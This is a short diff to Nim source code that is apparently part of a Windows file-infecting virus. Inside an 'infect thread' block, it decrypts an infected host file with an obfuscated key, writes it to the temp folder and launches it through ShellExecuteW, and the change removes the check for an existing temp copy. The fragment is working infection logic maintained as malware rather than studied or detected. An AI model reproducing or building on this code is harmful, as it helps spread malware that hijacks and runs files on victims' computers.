@@ -6,7 +6,6 @@ when USE_INFECT_THREAD:
   from os import getEnv
   from os import `/`
   from os import splitFile
-  from os import existsFile
   from winim/inc/shellapi import ShellExecuteW
   from winim/winstr import winstrConverterStringToLPWSTR
 
@@ -22,14 +21,13 @@ when USE_INFECT_THREAD:
       let (_, name, ext) = splitFile file
       let tmpFile = getEnv(d e"tmp") / name & ext
 
-      if not existsFile(tmpFile):
-        writeFile(
-          tmpFile,
-          decrypt(
-            readFile file,
-            d INFECT_ENCRYPTION_KEY
-          )
-        ) # write decrypted file
+      writeFile(
+        tmpFile,
+        decrypt(
+          readFile file,
+          d INFECT_ENCRYPTION_KEY
+        )
+      ) # write decrypted file
 
       discard ShellExecuteW(0, nil, tmpFile, nil, nil, 5) # open decryped file
 
